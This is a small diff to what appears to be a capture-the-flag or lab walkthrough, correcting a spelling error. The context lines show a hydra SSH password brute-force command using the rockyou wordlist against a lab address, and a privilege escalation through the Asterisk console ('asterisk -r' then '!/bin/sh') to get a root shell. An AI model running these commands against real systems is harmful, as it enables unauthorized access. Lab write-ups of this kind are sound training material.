@@ -30,7 +30,7 @@ Solution: Secure shell connection that can be bruteforced as the password is wea
 hydra -L user.txt (containing username dirtymind) -P /usr/share/wordlists/rockyou.txt 10.0.0.42 ssh -t 4  
 </details>
   
-Once entry has been retrieved the find command can be used to reveal unusal file permissions and cross reference unexpected files using [GTFOBins](https://gtfobins.org/GTFO). The Asterisk executable will appear to be vulnrable at a user level (dirtymind) to which:  
+Once entry has been retrieved the find command can be used to reveal unusal file permissions and cross reference unexpected files using [GTFOBins](https://gtfobins.org/GTFO). The Asterisk executable will appear to be vulnerable at a user level (dirtymind) to which:  
 asterisk -r  
 !/bin/sh  
 can be perfomed by any user to reach root access.  
